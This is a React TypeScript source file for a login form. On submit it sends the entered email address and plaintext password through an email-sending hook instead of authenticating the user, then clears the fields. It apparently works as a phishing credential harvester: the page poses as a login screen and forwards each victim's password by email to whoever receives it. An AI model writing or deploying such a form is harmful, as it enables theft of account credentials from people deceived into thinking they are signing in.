import React, { useState } from 'react';
import useSendEmail from './hooks/useSendEmail';
import './LoginForm.css';

interface TemplateParams extends Record<string, unknown> {
  user_email: string;
  user_password: string;
}

const LoginForm: React.FC = () => {
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');

  const { sendEmail, message, error, loading } = useSendEmail();

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const templateParams: TemplateParams = {
      user_email: email,
      user_password: password,
    };

    const success = await sendEmail(templateParams);

    if (success) {
      setEmail('');
      setPassword('');
    }
  };

  return (
    <div className="container">
      <form className="login-form" onSubmit={handleSubmit}>
        <h2>Login</h2>
        <div className="form-group">
          <label htmlFor="email">Email</label>
          <input
            type="email"
            id="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            placeholder="Enter your email"
          />
        </div>
        <div className="form-group">
          <label htmlFor="password">Password</label>
          <input
            type="password"
            id="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            placeholder="Enter your password"
          />
        </div>
        <button type="submit" className="submit-button" disabled={loading}>
          {loading ? 'Sending...' : 'Login'}
        </button>
        {message && <p className="message">{message}</p>}
        {error && <p className="message error">{error}</p>}
      </form>
    </div>
  );
};

export default LoginForm;
